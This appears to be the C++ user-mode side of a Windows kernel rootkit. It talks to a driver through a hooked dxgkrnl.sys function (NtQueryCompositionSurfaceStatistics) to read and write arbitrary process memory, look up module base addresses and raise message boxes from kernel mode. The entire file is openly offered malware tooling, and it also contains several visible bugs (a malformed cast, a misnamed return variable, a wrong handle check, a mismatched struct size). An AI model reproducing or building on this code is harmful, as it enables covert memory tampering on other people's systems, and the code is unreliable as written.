#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <memory>
#include <string_view>
#include <cstdint>
#include <vector>

// Kernel memory communication (through hook) struct -
typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
	void* Buffer;  // buffer address (used for example in inputs)
	UINT_PTR Address;  // actual memory address that will be worked on
	ULONGLONG Size; // size of memory chunk
	ULONG Pid; // process that works on the memory
	void* Out;  // pointer in memory to the output of the memory function
	BOOLEAN Write;   // does the operation need to write memory?
	BOOLEAN Read;   // does the operation need to read memory?
	BOOLEAN ReqBase;  // is this a request for a module base?
	const char* MdlName;  // (if the operation requests for a module base) what is the name of the system module? (driver names)
	ULONG64 BaseAddr;  // (if the operation requests for a module base) is the base address returned from request module base function
	BOOLEAN DsplMsgBox;  // is this a request to display a message box?
	PCWSTR BoxTitle;  // (if the operation requests for a messagebox) what is the title?
	PCWSTR BoxMsg;  // (if the operation requests for a messagebox) what is the message?
	ULONG_PTR BoxType;  // (if the operation requests for a messagebox) what is the type of the box?
}ROOTKIT_MEMORY;


// Getting a process ID and a handle for the function being called:

// Get Handle -
struct GetHandle {  // iterates through possible handles 
	using pointer = HANDLE;
	void operator()(HANDLE Handle) const {
		if (Handle != NULL || Handle != INVALID_HANDLE_VALUE) {
			CloseHandle(Handle);  // take the first valid handle that comes up by closing it and using it after
		}
	}
};
using UniqueHndl = std::unique_ptr<HANDLE, GetHandle>;  // get a unique handle to use for the function process


// Get PID -
std::uint32_t GetPID(std::string_view PrcName) {  // get PID for function process
	PROCESSENTRY32 PrcEntry;
	const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
	if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
		return NULL; // invalid handle
	}
	PrcEntry.dwSize = sizeof(MODULEENTRY32);  // set size of function process entry (after validating the given handle)
	while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
		if (PrcName.compare(PrcEntry.szExeFile) == NULL) {
			return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
		}
	}
	return NULL;  // if something did not work correctly
}


// Global variables (CHANGE TO ANOTHER SOLUTION) -
uintptr_t BaseAddr = 0;
std::uint32_t PrcID = 0;


// communicate with the KM driver (through the hooking mechanism) -
template<typename ... Arg>
uint64_t CallHook(const Arg ... args)  // call the HookHandler function (by the hookto function from dxgkrnl.sys)
{
	void* HookToFunc = GetProcAddress(LoadLibrary("win32u.dll"), "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function
	auto Function = static_cast<uint64_t(_stdcall*)(Arg ...)>HookToFunc);  // export the function so i can call it
	return Function(args ...);
}


// (CURRENT) options available for hooking parameters for different operations:

// Get module base address by name - 
static ULONG64 GetModuleBaseAddress(const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	RootkInstructions.Pid = PrcID;
	RootkInstructions.ReqBase = TRUE;
	RootkInstructions.Read = FALSE;
	RootkInstructions.Write = FALSE;
	RootkInstructions.DsplMsgBox = FALSE;
	RootkInstructions.MdlName = ModuleName;
	CallHook(RootkInstructions);  // pass instructions to hooking function (KM driver function)

	ULONG64 MdlBase = NULL;
	MdlBase = RootkInstructions.BaseAddr;  // get module base address
	return MdlBase;
}


// Display messagebox from kernel mode - 
static ULONG DisplayMsgBoxFromKMD(PCWSTR title, PCWSTR msg, ULONG_PTR type) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	ULONG MsgBoxResponse;

	RootkInstructions.Pid = PrcID;
	RootkInstructions.DsplMsgBox = TRUE;
	RootkInstructions.ReqBase = FALSE;
	RootkInstructions.Read = FALSE;
	RootkInstructions.Write = FALSE;
	RootkInstructions.BoxTitle = title;
	RootkInstructions.BoxMsg = msg;
	RootkInstructions.BoxType = type;
	RootkInstructions.Out = &MsgBoxResponse;
	
	CallHook(RootkInstructions);  // pass instructions to hooking function (KM driver function)
	return MsgBoxResponse;
}


// Read from kernel memory - 
template <class T>
T ReadFromRootkKMD(UINT_PTR  ReadAddress) {
	ROOTKIT_MEMORY RootkInstructions;
	T Response;

	RootkInstructions.Pid = PrcID;
	RootkInstructions.Size = sizeof(T);
	RootkInstructions.Address = ReadAddress;
	RootkInstructions.Read = TRUE;
	RootkInstructions.ReqBase = FALSE;
	RootkInstructions.Write = FALSE;
	RootkInstructions.DsplMsgBox = FALSE;
	RootkInstructions.Out = &Response;
	CallHook(&RootkInstructions);

	return response;
}


// Write into kernel memory (wrapper) - 
template <typename WriteWrapper>  // make a wrapper function to write into memory
bool WriteToRootkKMD(UINT_PTR WriteAddress, const WriteWrapper& value) {
	return ActWriteToRootkKMD(WriteAddress, (UINT_PTR)&value, sizeof(WriteWrapper));
}


// Write into kernel memory - 
bool ActWriteToRootkKMD(UINT_PTR  WriteAddress, UINT_PTR SrcAddress, SIZE_T WriteSize) {
	ROOTKIT_MEMORY RootkInstructions;

	RootkInstructions.Pid = PrcID;
	RootkInstructions.Size = WriteSize;
	RootkInstructions.Write = TRUE;
	RootkInstructions.ReqBase = FALSE;
	RootkInstructions.DsplMsgBox = FALSE;
	RootkInstructions.Read = FALSE;
	RootkInstructions.Address = WriteAddress;
	RootkInstructions.Buffer = (void*)SrcAddress;

	CallHook(&RootkInstructions);
	return true;
}
